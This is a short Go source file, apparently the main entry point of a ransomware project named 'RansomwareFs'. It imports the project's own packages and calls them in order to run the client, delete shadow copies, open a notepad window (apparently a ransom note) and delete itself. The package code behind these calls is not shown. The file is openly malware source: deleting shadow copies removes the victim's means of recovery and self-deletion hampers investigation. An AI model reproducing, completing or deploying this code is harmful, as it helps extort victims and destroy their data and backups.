package main

import (
	"RansomwareFs/client"
	"RansomwareFs/client/delete_shadow"
	_ "RansomwareFs/client/mutex"
	"RansomwareFs/client/new_notepad"
	"RansomwareFs/client/self_delete"
)

func main() {
	client.Run()
	delete_shadow.DeleteShadow()
	new_notepad.NewNotepad()
	self_delete.SelfDelete()
}
